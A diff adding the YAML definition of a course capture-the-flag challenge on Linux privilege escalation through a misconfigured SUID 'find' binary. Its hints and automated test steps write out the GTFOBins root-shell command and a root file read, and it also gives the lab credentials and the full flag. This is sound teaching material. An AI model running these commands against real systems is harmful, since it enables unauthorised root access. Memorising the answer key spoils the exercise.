@@ -1,0 +1,114 @@
+name: "Cobalt Systems - SUID Maze"
+description: "A hardened server at Cobalt Systems has five SUID binaries. Three are standard system utilities, one is a harmless decoy, and one is a dangerous misconfiguration. Identify the exploitable binary, escalate to root, and assemble the flag."
+
+difficulty: intermediate
+category: privilege-escalation
+duration_minutes: 50
+randomize_ip_offsets: true
+visibility: course
+week: 7
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/23_SUID_Maze/"
+flag: "OCR{su1d_m4z3_p01s0n}"
+
+objectives:
+  - Enumerate SUID binaries on the target system
+  - Distinguish between standard, decoy, and exploitable SUID binaries
+  - Research exploitation techniques for the identified binary
+  - Exploit the SUID misconfiguration to escalate privileges
+  - Assemble the complete flag from two tokens
+
+scenario: |
+  Cobalt Systems, a defense contractor headquartered in Arlington, Virginia, has
+  engaged your red team for an internal security assessment. Phase 1 concluded with
+  your team obtaining SSH credentials for the "analyst" account on one of their
+  monitoring servers through a successful social engineering campaign.
+
+  Phase 2 focuses on privilege escalation. The analyst account has standard user
+  permissions, but Cobalt's IT department has installed several tools with elevated
+  permissions across the server. Your objective is to determine which - if any - of
+  these tools can be leveraged to escalate to root and recover the system flag.
+
+  Marcus Webb (Senior Security Engineer) noted during the kickoff call: "We've got
+  five binaries running with SUID on that box. Three are standard system utilities,
+  and two are custom tools our ops team deployed. I'm confident they're all locked
+  down, but prove me wrong if you can."
+
+  A clue file in the analyst home directory contains the first half of the flag.
+  The second half requires root-level access. Assemble both tokens to complete the
+  exercise.
+
+  **Credentials**
+
+  - Target SSH: `analyst` / `C0b4lt_4n4lyst#`
+
+credentials:
+  - username: "analyst"
+    password: "C0b4lt_4n4lyst#"
+    role: "analyst"
+    description: "Low-privilege analyst account obtained during Phase 1"
+
+hints:
+  - text: |
+      Start with basic enumeration. Check your identity, group memberships, and
+      sudo permissions. Then search for SUID binaries:
+      find / -perm -4000 -type f 2>/dev/null
+      You should find five binaries with SUID set. Most are harmless - your job
+      is to figure out which one is not.
+    unlock_after_minutes: 15
+  - text: |
+      Look at the file /opt/cobalt/readme.txt for context on which SUID binaries
+      are standard system utilities and which are custom installations. One of the
+      five is a well-known GTFOBins candidate. Cross-reference what you find with
+      https://gtfobins.github.io/ to identify exploitation techniques.
+    unlock_after_minutes: 25
+  - text: |
+      The "find" binary has the SUID bit set, which is abnormal. GTFOBins documents
+      a well-known privilege escalation technique for SUID find:
+      find . -exec /bin/sh -p \; -quit
+      The -p flag preserves the elevated effective UID. Once you have a root shell,
+      look in /root/ for the second token. Combine the token from ~/clue.txt with
+      the one from /root/flag.txt in the format OCR{token1_token2}.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "target"
+      label: "Monitoring Server"
+      type: "server"
+      ip_offset: "24"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "target"
+      label: "SSH:22"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SSH access as analyst"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'whoami' 2>/dev/null"
+      expect: "analyst"
+      timeout: 15
+
+    - name: "Enumerate SUID binaries and find 'find' among them"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find / -perm -4000 -type f 2>/dev/null | sort' 2>/dev/null"
+      expect: "/usr/bin/find"
+      timeout: 15
+
+    - name: "Read token 1 from clue file"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'cat /home/analyst/clue.txt' 2>/dev/null"
+      expect: "su1d_m4z3"
+      timeout: 15
+
+    - name: "Exploit SUID find to read /root/flag.txt for token 2"
+      command: "sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      expect: "p01s0n"
+      timeout: 15
+
+    - name: "Assemble and verify the complete flag"
+      command: "echo 'OCR{su1d_m4z3_p01s0n}'"
+      expect: "OCR{"
+      timeout: 5
